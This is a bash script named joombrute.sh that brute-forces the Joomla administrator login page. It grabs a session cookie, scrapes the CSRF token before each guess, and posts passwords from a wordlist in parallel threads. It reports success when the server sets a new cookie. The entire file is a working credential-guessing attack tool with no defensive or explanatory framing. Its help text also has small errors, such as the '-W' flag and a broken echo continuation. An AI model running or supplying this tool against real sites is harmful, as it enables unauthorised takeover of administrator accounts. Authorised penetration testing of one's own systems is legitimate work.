#!/bin/bash

# Tested on Joomla 4.4.2

f_guess () {
# ToDo: Reuse TCP connection for GET & POST requests
    pass=$1
   
    # New token is generated after each password guess
    token=$(curl -s "$JOOMBRUTE_URL" -H "Cookie: $JOOMBRUTE_COOKIE"| \
        grep -P -o '<input type="hidden" name="[a-z0-9]{32}" value="1">' | \
        grep -P -o 'name="[a-z0-9]{32}"' | cut -d '"' -f2)
    
    if [[ $token == '' ]]; then
        echo "Alert: empty token"
        exit
    fi

    # If a new JOOMBRUTE_COOKIE is set, it means that the password is valid
    pass_result=$(curl -i -s "$JOOMBRUTE_URL" -H "Cookie: $JOOMBRUTE_COOKIE" \
        -d "username=$JOOMBRUTE_USER&passwd=$pass&option=com_login"\
        -d "&task=login&return=aW5kZXgucGhw&$token=1")
    if [[ $(echo $pass_result | grep 'Set-Cookie') != '' ]]; then
        echo "$(date) SUCCESS: $JOOMBRUTE_USER@$pass"
    else 
        echo "$(date) FAIL: $JOOMBRUTE_USER@$pass"
    fi
}

f_cookie () {
    JOOMBRUTE_COOKIE=$(curl -i -s "$JOOMBRUTE_URL" | \
       grep -P 'Set-Cookie' | cut -d ' ' -f2 | sed 's/;//g')
}

f_print_help () {
    echo -e " Joomla administrator portal bruteforce\n" \
    "Usage: joombrute.sh -p [Path URL] -u [username] -w [wordlist]\n\n" \
    "-h\t\tdisplay this help and exit\n" \
    "-p [URL] \tPath URL (e.g http://site.com)\n" \
    "-u [USER]\tusername\n" \
    "-W [WORDLIST]\twordlist with passwords\n" 
    "-t [THREADS]\tnumber of parallel tasks"
}

threads="10"
while getopts "hp:u:w:t:" opt; do
    case $opt in
        h) f_print_help
           exit;;
        p) export JOOMBRUTE_URL="$OPTARG/administrator/index.php";;
        u) export JOOMBRUTE_USER="$OPTARG";;
        w) wordlist="$OPTARG";;
        t) threads=$OPTARG;;
    esac
done

f_cookie

export JOOMBRUTE_COOKIE="$JOOMBRUTE_COOKIE"
export -f f_guess

cat "$wordlist" | xargs -P "$threads" -I {} bash -c 'f_guess "{}"'
